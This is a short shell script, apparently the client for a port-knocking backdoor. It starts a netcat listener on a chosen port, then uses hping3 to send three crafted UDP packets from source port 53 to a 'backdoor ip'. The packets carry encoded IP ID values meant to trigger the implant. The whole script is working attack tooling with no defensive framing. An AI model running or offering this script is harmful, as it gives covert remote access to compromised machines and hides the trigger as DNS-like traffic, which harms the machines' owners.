#!/bin/sh


if [ $# -lt 2 ]
	then
		echo ". client.sh [listen port] [backdoor ip]"
		exit
fi

PORT=$1
IP=$2
TRY=2

n=$RANDOM
A=$(((RANDOM%899+100)*100+82))
B=$(((RANDOM%899+100)*100+71))
C=$(((RANDOM%899+100)*100+66))


nc -l $PORT &

hping3 -2 -c 1 -N $A -d 111 -s 53 -p $PORT $IP
hping3 -2 -c 1 -N $B -d 111 -s 53 -p $PORT $IP
hping3 -2 -c 1 -N $C -d 111 -s 53 -p $PORT $IP

